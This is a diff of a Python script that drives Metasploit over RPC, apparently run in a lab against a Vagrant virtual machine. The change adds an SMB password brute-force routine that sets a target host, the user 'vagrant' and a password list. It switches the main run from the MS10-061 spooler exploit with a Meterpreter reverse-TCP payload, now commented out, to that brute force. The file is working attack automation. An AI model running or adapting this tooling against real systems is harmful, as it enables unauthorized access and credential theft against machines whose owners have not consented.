@@ -6,9 +6,8 @@ from pymetasploit3.msfrpc import MsfRpcClient, ExploitModule, PayloadModule, Msf
 from src.libs.Tools import Get_Printer
 from src.libs.Tools import get_ipv4
 from src.libs.modules.list.Exploit_List import Exploit
-#
 from src.libs.modules.list.Payload_List import Payload
-
+from src.libs.modules.list.Exploit_List import Auxiliary
 
 #
 class Attack:
@@ -82,6 +81,23 @@ class Attack:
             self.__console.run_module_with_output(self.__module, PayloadModule(self.__rpc, self.__payload))
         )
 
+    def run_password_brute_force(self):
+        mname = self.__exploit_path
+        self.__module = self.__rpc.modules.use("auxiliary", mname)
+
+        self.__module["RHOSTS"] = self.__rhost
+        self.__module["SMBUser"] = "vagrant" # for test
+        # self.__module["SMBPass"] = "vagrant2"
+
+        self.__module["PASS_FILE"] = "PassList/test_pwd.txt"
+        # self.__module["USER_FILE"] = 
+        cid = self.__rpc.consoles.console().cid
+        self.__console = self.__rpc.consoles.console(cid)
+
+        print(
+            self.__console.run_module_with_output(self.__module)
+        )
+
     def Get_console(self):
         while True:
             print(self.__console.read()["data"])
@@ -94,13 +110,14 @@ class Attack:
 if __name__ == '__main__':
     # connection
     client = MsfRpcClient("salt", port=55553, ssl=True)
-    atk = Attack(client, rhost="10.0.2.10")
+    atk = Attack(client, rhost="10.0.2.15")
     
     # init
-    atk.setExploit(Exploit.MS10_061_SPOOLSS)
-    atk.setPayload('windows/meterpreter/reverse_tcp')
+    atk.setExploit(Auxiliary.SMB_LOGIN)
+    atk.run_password_brute_force()
+    # atk.setPayload('windows/meterpreter/reverse_tcp')
 
 
     # attack
-    atk.run_smb_spoolss()
+    # atk.run_smb_spoolss()
     atk.Get_console()
